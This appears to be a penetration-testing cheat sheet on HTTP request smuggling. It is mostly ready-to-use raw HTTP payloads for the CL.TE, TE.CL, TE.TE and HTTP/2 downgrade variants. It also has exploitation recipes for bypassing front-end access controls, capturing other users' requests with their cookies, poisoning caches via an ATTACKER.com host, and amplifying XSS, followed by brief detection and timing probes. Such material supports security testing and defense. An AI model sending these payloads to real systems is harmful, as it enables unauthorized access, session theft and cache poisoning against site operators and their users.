# HTTP Request Smuggling

## Overview

```
# Exploit discrepancies between how front-end (proxy/CDN) and back-end
# servers determine the boundary between HTTP requests.
# Two headers define request body length:
#   Content-Length (CL) — exact byte count
#   Transfer-Encoding (TE) — chunked encoding

# If front-end uses CL but back-end uses TE (or vice versa):
# → Attacker can "smuggle" a second request inside the first
```

## CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
# More dangerous — smuggle full request:
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

## TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## TE.TE (Both use TE, but obfuscation makes one ignore it)

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\r\n\r\n
Transfer-Encoding:[\x09]chunked
Transfer-Encoding:\x00chunked
```

## HTTP/2 Downgrade Smuggling

```
# HTTP/2 front-end → HTTP/1.1 back-end
# H2 doesn't use CL/TE in the same way
# Inject CL or TE headers in H2 pseudo-headers

# H2.CL smuggling:
:method: POST
:path: /
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable.com

# H2.TE smuggling:
:method: POST
:path: /
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

## Exploitation Techniques

### Bypass Front-End Access Controls
```http
# If /admin is blocked by front-end but not back-end:
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
X: X
```

### Capture Other Users' Requests
```http
# Smuggle request that stores next user's request in a parameter
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10000

data=
# → Next user's request (with cookies/auth) is appended to "data" parameter
```

### Web Cache Poisoning
```http
# Smuggle request to make cache store malicious response
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: ATTACKER.com
X: X
# → Cache stores attacker's response for /static/main.js
```

### Reflected XSS Amplification
```http
# Turn reflected XSS into stored by poisoning responses
POST / HTTP/1.1
Content-Length: 100
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
X: X
# → Other users receive the XSS response
```

## Detection

```bash
# Turbo Intruder (Burp Suite) — most reliable
# HTTP Request Smuggler (Burp extension) — automated detection
# smuggler.py (CLI tool)
python3 smuggler.py -u https://TARGET

# Manual detection:
# 1. Send ambiguous CL/TE request
# 2. If response is unexpected or delayed → potential smuggling
# 3. Confirm by smuggling a request that causes detectable effect
#    (e.g., GET /404 → if next request gets 404, smuggling confirmed)
```

## Timing-Based Detection

```http
# CL.TE detection: if back-end uses TE, it waits for chunk terminator
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
# If response is delayed → back-end uses TE (CL.TE likely)

# TE.CL detection: if back-end uses CL, it processes only CL bytes
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6

0

X
# If response is delayed → back-end uses CL (TE.CL likely)
```
